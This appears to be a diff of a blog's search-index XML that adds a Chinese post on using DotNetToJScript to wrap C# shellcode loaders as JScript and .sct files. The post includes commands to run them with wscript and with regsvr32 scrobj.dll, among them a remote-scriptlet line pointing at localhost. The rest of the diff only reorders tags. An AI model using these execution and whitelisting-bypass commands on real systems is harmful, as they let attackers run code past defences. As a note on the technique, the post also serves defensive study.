@@ -4,6 +4,36 @@
   
     
     <entry>
+      <title><![CDATA[c#2js]]></title>
+      <url>http://phpplay.github.io/2017/04/12/c-2js-1/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="c-2js"><a href="#c-2js" class="headerlink" title="c#2js"></a>c#2js</h2><p>今天无意看到subTee Fork 了一个DotNetToJScript的库，一下起了兴趣，看库名就是好东西，结果发现真的是个神器啊</p>
+<p>然后看了subTee的blog，就研究了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">作用：将c# 转换为 js 调用底层api 运行shellcode ，简直不能再赞</div><div class="line"></div><div class="line">缺点：只能在clr v2 里使用</div></pre></td></tr></table></figure></p>
+<p>DotNetToJScript  可以生成js，sct格式文件</p>
+<p>不过几个参数我还没搞太懂，但也可以用了，英语太渣了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-n   生成js</div><div class="line">-m   生成sct </div><div class="line">-u   生成sct 一般常用这个</div><div class="line">-o=  输出到一个文件</div><div class="line">-c=  指定类明</div><div class="line">-s=  使用附加脚本指定文件。创建实例（这一项不太懂）</div></pre></td></tr></table></figure>
+<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>我测试时只使用了几个命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">DotNetToJScript.exe -n xxx.dll  &gt;xxx.js 和</div><div class="line">DotNetToJScript.exe -u xxx.dll  &gt;xxx.sct</div><div class="line">wscript xxx.js</div><div class="line">regsvr32  /s /u /i:xxx.sct scrobj.dll</div></pre></td></tr></table></figure></p>
+<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><img src="/images/1.png" class="[1]">
+<img src="/images/2.png" class="[2]">
+<img src="/images/3.png" class="[3]">
+<img src="/images/4.png" class="[4]">
+<img src="/images/5.png" class="[5]">
+<p>效果很好  感觉世界都美起来了，然后又复习了一下regsvr32的常用知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">regsvr32 [/u] [/s] [/n] [/i[:cmdline]] dllname</div><div class="line">/u -  解除服务器注册</div><div class="line">/s -  无声；不显示消息框</div><div class="line">/i -　调用 DllInstall，给其传递一个可选 [cmdline]；跟/u一起使用时，卸载dll</div><div class="line">/n -　不要调用DllRegisterServer；这个选项必须跟/i一起使用</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">执行本地脚本</div><div class="line">regsvr32  /s /u /i:file.sct scrobj.dll</div><div class="line"></div><div class="line">执行远程脚本</div><div class="line">regsvr32  /s /n  /u /i::http://127.0.0.1/2333.sct scrobj.dll</div></pre></td></tr></table></figure>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">https://gist.github.com/subTee/618d40aa4229581925eb9025429d8420</div><div class="line"></div><div class="line">http://subt0x10.blogspot.hk/2017/04/using-dotnettojscript-working-example.html</div><div class="line"></div><div class="line">https://github.com/tyranid/DotNetToJScript</div></pre></td></tr></table></figure>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> c# </tag>
+            
+            <tag> javascript </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[csv]]></title>
       <url>http://phpplay.github.io/2017/04/05/csv-test/</url>
       <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="csv生成"><a href="#csv生成" class="headerlink" title="csv生成"></a>csv生成</h2><p>放假回来后感觉好累，好适合学习，看到别人写的工具可以生成csv，所以就把自己的脚本也添加上试试。还有就是改进了域名验证的过程。</p>
@@ -66,9 +96,9 @@
         
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> python </tag>
+            
+            <tag> 网络安全 </tag>
             
         </tags>
         
@@ -162,9 +192,9 @@
         
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> python </tag>
+            
+            <tag> 网络安全 </tag>
             
         </tags>
         
@@ -198,9 +228,9 @@
         
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> python </tag>
+            
+            <tag> 网络安全 </tag>
             
         </tags>
         
@@ -217,9 +247,9 @@
         
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> python </tag>
+            
+            <tag> 网络安全 </tag>
             
         </tags>
         
